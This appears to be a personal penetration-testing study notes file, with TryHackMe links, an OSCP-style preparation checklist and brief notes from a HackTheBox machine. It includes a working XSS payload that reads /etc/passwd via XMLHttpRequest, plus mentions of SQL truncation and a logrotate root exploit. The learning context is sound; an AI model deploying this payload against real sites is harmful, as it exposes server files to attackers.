https://tryhackme.com/network/throwback

https://tryhackme.com/room/adenumeration

https://tryhackme.com/room/breachingad

# things to do in tryhack me

    hackthebox finish all easy boxes and do some pro labs (last is more for fun)

    make sure to be able to go though every box on TJ nulls list

    Tiberius priv escalation course (Linux and windows)

    make sure to write good notes and writeups (also publish them on git pages for further reference)

    read though a pdf and video course similar to oscp

    have a decent Kali machine setup and prepared


what is tiberius privilege escalation course

# Hack the box book

SQL truncation attack , adding things to the row whicjh is longer than what is required and adding a row 

things one can try in a site:

```

    Looking for SQLi in all the forms.
    Looking for XSS in all the forms.
    Looking for any kind of XSRF vulnerabilities in the various GETs and POSTs.

```

XSS for file read

```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

```

after getting in we can get ssh key

and root had a logrotate exploit





